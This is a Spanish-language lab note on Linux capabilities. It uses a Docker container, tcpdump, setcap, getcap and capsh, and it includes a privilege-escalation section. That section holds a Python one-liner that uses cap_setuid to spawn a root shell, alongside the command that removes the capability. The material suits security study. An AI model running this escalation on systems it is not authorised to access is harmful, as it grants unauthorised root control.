## 🧠 Teoría

Las **Linux Capabilities** permiten dividir los privilegios de root en permisos más pequeños y controlados, otorgando a los procesos solo los privilegios que realmente necesitan.

> [!info]  
> **Importante:**  
> Las capabilities afectan a los **procesos**, no a los usuarios.

---

## 🛠️ Práctica: Laboratorio con Docker

### 1. Preparar el entorno

#### Descargar la imagen de Ubuntu

```bash
docker pull ubuntu:latest
```

#### Crear el contenedor con privilegios elevados

```bash
docker run -dit --privileged --name ubuntuServer ubuntu
```

> [!warning]  
> **La flag `--privileged` es necesaria para capturar tráfico de red con tcpdump.**

#### Acceder al contenedor

```bash
docker exec -it ubuntuServer bash
```

#### Actualizar e instalar herramientas

```bash
apt update
apt install libcap2-bin tcpdump net-tools -y
```

- **libcap2-bin**: Proporciona [[getcap]] y [[setcap]]
- **tcpdump**: Herramienta para capturar tráfico de red
- **net-tools**: Incluye utilidades como `ifconfig`

---

### 2. Crear un usuario de prueba

```bash
useradd liskov -m -s /bin/bash
```

| Flag | Descripción |
|------|-------------|
| `-m` | Crea el directorio home |
| `-s` | Asigna el shell |
| `-d` | Asigna el home (opcional si usás `-m`) |

---

### 3. Probando tcpdump

#### Identificar interfaces de red

```bash
ifconfig
```

#### Capturar tráfico ICMP

```bash
tcpdump -i eth0 icmp -n -w Captura.cap
```

| Flag | Descripción |
|------|-------------|
| `-i eth0` | Interfaz de red (usualmente ethernet) |
| `icmp` | Filtro para paquetes ICMP |
| `-n` | No resuelve IPs a nombres de dominio |
| `-w` | Guarda la captura en un archivo |

---

## 🔍 Listar y analizar capabilities

### Ver capabilities de procesos

1. Listar PIDs:
```bash
ls /proc/
```
2. Ver detalles de un proceso (ejemplo PID 1234):
```bash
ls -l /proc/1234/
cat /proc/1234/status | grep Cap
```

> [!example]  
> Salida esperada:  
    > `CapEff: 000001ffffffffff`

3. Decodificar capabilities:
```bash
capsh --decode=000001ffffffffff
```

---

### Ver capabilities de binarios

#### Asignar capabilities a tcpdump

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```

> [!tip]  
> **¿Qué estamos haciendo?**  
> - `cap_net_raw`: Permite crear sockets RAW  
> - `cap_net_admin`: Permite administrar interfaces de red  
> - `=eip`: Asigna las capabilities como Effective, Inheritable y Permitted

#### Ver capabilities de un binario

```bash
getcap /usr/sbin/tcpdump
```

#### Buscar capabilities en todo el sistema

```bash
getcap -r / 2>/dev/null
```

#### Ver capabilities de un proceso

```bash
getpcaps <pid>
```

---

## 🚩 Escalada de privilegios con capabilities

### Capability peligrosa: `cap_setuid`

> [!warning]  
> **cap_setuid** permite cambiar de usuario sin contraseña.

#### Ejemplo de explotación con Python

Si encontrás `/usr/bin/python = cap_setuid+ep`:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> [!info]  
> `os.setuid(0)` cambia el UID del proceso a root y luego ejecuta una shell.

#### Remover capability peligrosa

```bash
setcap -r /usr/bin/python
```

---

## 🗂️ Tabla de comandos útiles

| Comando | Descripción |
|---------|-------------|
| `getcap <binario>` | Ver capabilities de un binario |
| `setcap <caps> <binario>` | Asignar capabilities |
| `getcap -r / 2>/dev/null` | Buscar capabilities en todo el sistema |
| `getpcaps <pid>` | Ver capabilities de un proceso |
| `capsh --decode=<hex>` | Decodificar capabilities en formato hexadecimal |

---

## 🧰 Recursos: GTFOBins

> [!info]  
> **GTFOBins** es una lista seleccionada de binarios de Unix que se pueden utilizar para eludir las restricciones de seguridad locales en sistemas mal configurados.  
>  
> - [GTFOBins](https://gtfobins.github.io/)  
> - [Funciones](https://gtfobins.github.io/functions/)  
> - [Colaboradores](https://github.com/GTFOBins/GTFOBins.github.io/graphs/contributors)  
> - [LOLBAS (Windows)](https://lolbas-project.github.io/)

> [!tip]  
> Para más técnicas de explotación con capabilities, consultá [[GTFOBins]].

---

## 🗺️ Diagrama de flujo: Escalada con cap_setuid

```mermaid
flowchart TD
    A[Reconocimiento de capabilities] --> B{¿cap_setuid en binario?}
    B -- Sí --> C[Ejecutar exploit Python]
    C --> D[Obtener shell root]
    B -- No --> E[Buscar otras capabilities]
```



